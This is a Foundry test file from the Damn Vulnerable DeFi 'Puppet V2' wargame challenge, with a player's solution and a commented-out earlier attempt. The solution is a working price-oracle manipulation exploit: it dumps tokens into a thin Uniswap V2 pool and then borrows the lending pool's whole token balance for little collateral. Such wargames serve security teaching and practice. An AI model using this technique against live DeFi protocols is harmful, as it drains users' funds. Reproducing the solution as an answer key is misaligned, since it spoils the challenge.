// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        address[] memory path;
        path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Leaving my initial solution here for poserity. I tried to drive the price down by swapping DVT for WETH, but I ended up getting 10%
        // of the pool stuck in the swap. Instead, you can just swap tokens for ETH directly, and it's enough to pay immediately.

        // // I can't swap for all the WETH, but I can take 99% of it
        // token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        // uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE * 99/100, path, player, block.timestamp);

        // // Take 10% of the pool
        // weth.approve(address(lendingPool), PLAYER_INITIAL_ETH_BALANCE);
        // lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE / 10);

        // // Push down the price even farther
        // token.approve(address(uniswapV2Router), POOL_INITIAL_TOKEN_BALANCE / 10);
        // uniswapV2Router.swapExactTokensForTokens(POOL_INITIAL_TOKEN_BALANCE / 10, 9*10**16, path, player, block.timestamp);

        // // Grab the rest
        // lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE * 9/10);

        // // Get the 10% back ???
        // // weth.approve(address(uniswapV2Router), weth.balanceOf(player));
        // uniswapV2Exchange.approve(address(uniswapV2Exchange), 10e5);
        // uniswapV2Router.swapExactTokensForTokens(POOL_INITIAL_TOKEN_BALANCE / 10, 100 * 10**18, path, player, block.timestamp);
        // uniswapV2Router.removeLiquidity(address(token), address(weth), 10e5, POOL_INITIAL_TOKEN_BALANCE / 10, 0, player, block.timestamp);

        // token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE * 9/10);
    

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE * 99/100, path, player, block.timestamp);

        weth.deposit{value: player.balance-(0.1 ether)}();
        weth.approve(address(lendingPool), weth.balanceOf(player));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
